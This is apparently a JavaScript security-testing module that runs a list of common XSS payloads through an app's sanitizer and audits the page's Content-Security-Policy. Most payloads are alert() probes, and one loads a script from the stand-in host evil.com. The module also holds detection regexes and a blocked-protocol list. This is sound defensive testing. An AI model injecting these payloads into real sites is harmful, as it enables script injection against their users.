/**
 * Security Testing Utility
 * Provides functions to test XSS prevention and security measures
 * For development and testing purposes only
 */

import { sanitizeInput, escapeHtml, removeScripts, sanitizeUrl } from './sanitizer'

/**
 * Common XSS attack vectors for testing
 */
export const XSS_TEST_VECTORS = [
  // Script injection
  '<script>alert("XSS")</script>',
  '<script src="http://evil.com/xss.js"></script>',
  '<img src=x onerror="alert(\'XSS\')">',
  '<svg onload="alert(\'XSS\')">',
  
  // Event handlers
  '<div onclick="alert(\'XSS\')">Click me</div>',
  '<body onload="alert(\'XSS\')">',
  '<input onfocus="alert(\'XSS\')" autofocus>',
  
  // JavaScript protocol
  '<a href="javascript:alert(\'XSS\')">Click</a>',
  '<iframe src="javascript:alert(\'XSS\')"></iframe>',
  
  // Data protocol
  '<object data="data:text/html,<script>alert(\'XSS\')</script>">',
  
  // HTML entities
  '&lt;script&gt;alert("XSS")&lt;/script&gt;',
  
  // Mixed case
  '<ScRiPt>alert("XSS")</ScRiPt>',
  '<IMG SRC=x OnErRoR=alert("XSS")>',
  
  // Encoded
  '%3Cscript%3Ealert("XSS")%3C/script%3E',
  
  // Unicode
  '<script>alert\u0028"XSS"\u0029</script>',
  
  // Null bytes
  '<script\x00>alert("XSS")</script>',
  
  // Nested tags
  '<<script>script>alert("XSS")<</script>/script>',
  
  // Style injection
  '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
  '<div style="background:url(javascript:alert(\'XSS\'))">',
  
  // Meta refresh
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
  
  // Form injection
  '<form action="javascript:alert(\'XSS\')"><input type="submit"></form>'
]

/**
 * Test if input sanitization prevents XSS
 * @param {string} input - Input to test
 * @returns {Object} Test result
 */
export function testXSSPrevention(input) {
  const sanitized = sanitizeInput(input)
  
  // Check if dangerous patterns are removed
  const dangerousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+\s*=/i,
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /data:text\/html/i
  ]
  
  const foundDangerousPatterns = dangerousPatterns.filter(pattern => 
    pattern.test(sanitized)
  )
  
  return {
    original: input,
    sanitized,
    safe: foundDangerousPatterns.length === 0,
    dangerousPatterns: foundDangerousPatterns.map(p => p.toString())
  }
}

/**
 * Run all XSS test vectors
 * @returns {Object} Test results summary
 */
export function runXSSTests() {
  const results = XSS_TEST_VECTORS.map(vector => testXSSPrevention(vector))
  
  const passed = results.filter(r => r.safe).length
  const failed = results.filter(r => !r.safe).length
  
  return {
    total: results.length,
    passed,
    failed,
    passRate: (passed / results.length * 100).toFixed(2) + '%',
    results: results.filter(r => !r.safe) // Only show failures
  }
}

/**
 * Test URL sanitization
 * @param {string} url - URL to test
 * @returns {Object} Test result
 */
export function testURLSanitization(url) {
  const sanitized = sanitizeUrl(url)
  
  const dangerousProtocols = ['javascript:', 'data:', 'vbscript:', 'file:']
  const isDangerous = dangerousProtocols.some(protocol => 
    url.toLowerCase().startsWith(protocol)
  )
  
  return {
    original: url,
    sanitized,
    safe: isDangerous ? sanitized === '' : true,
    blocked: isDangerous && sanitized === ''
  }
}

/**
 * Test HTML escaping
 * @param {string} html - HTML to test
 * @returns {Object} Test result
 */
export function testHTMLEscaping(html) {
  const escaped = escapeHtml(html)
  
  // Check if special characters are escaped
  const hasUnescapedChars = /<|>|&(?!amp;|lt;|gt;|quot;|#x27;|#x2F;)|"|'/.test(escaped)
  
  return {
    original: html,
    escaped,
    safe: !hasUnescapedChars
  }
}

/**
 * Test script removal
 * @param {string} html - HTML to test
 * @returns {Object} Test result
 */
export function testScriptRemoval(html) {
  const cleaned = removeScripts(html)
  
  // Check if scripts are removed
  const hasScripts = /<script/i.test(cleaned) || /javascript:/i.test(cleaned)
  
  return {
    original: html,
    cleaned,
    safe: !hasScripts
  }
}

/**
 * Test CSP compliance
 * @returns {Object} CSP test results
 */
export function testCSPCompliance() {
  const results = {
    metaTag: false,
    inlineScripts: [],
    externalScripts: [],
    inlineStyles: [],
    recommendations: []
  }
  
  // Check for CSP meta tag
  const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]')
  results.metaTag = !!cspMeta
  
  if (cspMeta) {
    results.cspContent = cspMeta.getAttribute('content')
  }
  
  // Check for inline scripts (should be avoided with strict CSP)
  const inlineScripts = document.querySelectorAll('script:not([src])')
  results.inlineScripts = Array.from(inlineScripts).map(s => ({
    content: s.textContent.substring(0, 100) + '...',
    location: s.parentElement?.tagName
  }))
  
  // Check for external scripts
  const externalScripts = document.querySelectorAll('script[src]')
  results.externalScripts = Array.from(externalScripts).map(s => s.src)
  
  // Check for inline styles (should be avoided with strict CSP)
  const inlineStyles = document.querySelectorAll('[style]')
  results.inlineStyles = Array.from(inlineStyles).map(el => ({
    tag: el.tagName,
    style: el.getAttribute('style')
  }))
  
  // Generate recommendations
  if (!results.metaTag) {
    results.recommendations.push('Add Content-Security-Policy meta tag')
  }
  if (results.inlineScripts.length > 0) {
    results.recommendations.push(`Found ${results.inlineScripts.length} inline scripts - consider moving to external files`)
  }
  if (results.inlineStyles.length > 5) {
    results.recommendations.push(`Found ${results.inlineStyles.length} inline styles - consider using CSS classes`)
  }
  
  return results
}

/**
 * Run comprehensive security tests
 * @returns {Object} Complete test results
 */
export function runSecurityTests() {
  console.group('🔒 Security Tests')
  
  // XSS Prevention Tests
  console.group('XSS Prevention')
  const xssResults = runXSSTests()
  console.log(`Passed: ${xssResults.passed}/${xssResults.total} (${xssResults.passRate})`)
  if (xssResults.failed > 0) {
    console.warn('Failed tests:', xssResults.results)
  }
  console.groupEnd()
  
  // URL Sanitization Tests
  console.group('URL Sanitization')
  const urlTests = [
    'javascript:alert("XSS")',
    'data:text/html,<script>alert("XSS")</script>',
    'https://example.com',
    'http://localhost:9999/api'
  ]
  const urlResults = urlTests.map(testURLSanitization)
  console.table(urlResults)
  console.groupEnd()
  
  // CSP Compliance
  console.group('CSP Compliance')
  const cspResults = testCSPCompliance()
  console.log('CSP Meta Tag:', cspResults.metaTag ? '✓' : '✗')
  console.log('Inline Scripts:', cspResults.inlineScripts.length)
  console.log('External Scripts:', cspResults.externalScripts.length)
  if (cspResults.recommendations.length > 0) {
    console.warn('Recommendations:', cspResults.recommendations)
  }
  console.groupEnd()
  
  console.groupEnd()
  
  return {
    xss: xssResults,
    url: urlResults,
    csp: cspResults
  }
}

// Export for use in development console
if (import.meta.env.DEV) {
  window.securityTest = {
    runAll: runSecurityTests,
    testXSS: testXSSPrevention,
    testURL: testURLSanitization,
    testHTML: testHTMLEscaping,
    testScript: testScriptRemoval,
    testCSP: testCSPCompliance,
    vectors: XSS_TEST_VECTORS
  }
  
  console.log('💡 Security testing utilities available at window.securityTest')
}

export default {
  testXSSPrevention,
  runXSSTests,
  testURLSanitization,
  testHTMLEscaping,
  testScriptRemoval,
  testCSPCompliance,
  runSecurityTests,
  XSS_TEST_VECTORS
}
